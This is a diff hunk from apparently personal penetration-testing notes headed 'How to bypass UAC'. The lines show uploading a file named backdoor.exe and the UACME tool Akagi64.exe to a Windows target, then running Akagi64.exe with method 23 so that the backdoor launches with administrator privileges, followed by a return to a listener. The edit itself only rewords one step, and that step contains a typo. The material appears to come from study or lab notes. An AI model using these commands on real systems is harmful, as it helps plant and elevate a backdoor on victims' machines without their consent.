@@ -391,7 +391,7 @@ How to bypass UAC
 		- upload backdoor.exe
 		- upload /root/Desktop/tools/UACME/Akagi64.exe 
 		- right now we cannot execute these files with administrator privileges because UAC will prevent us so we need to Bypass uac
-	- \.\\Akagi64.exe 23 c:\Temp\\backdoor.exe 
+	- \in a new sell run .\\Akagi64.exe 23 c:\Temp\\backdoor.exe 
 		- now go back to listener (part 3)
 	
 
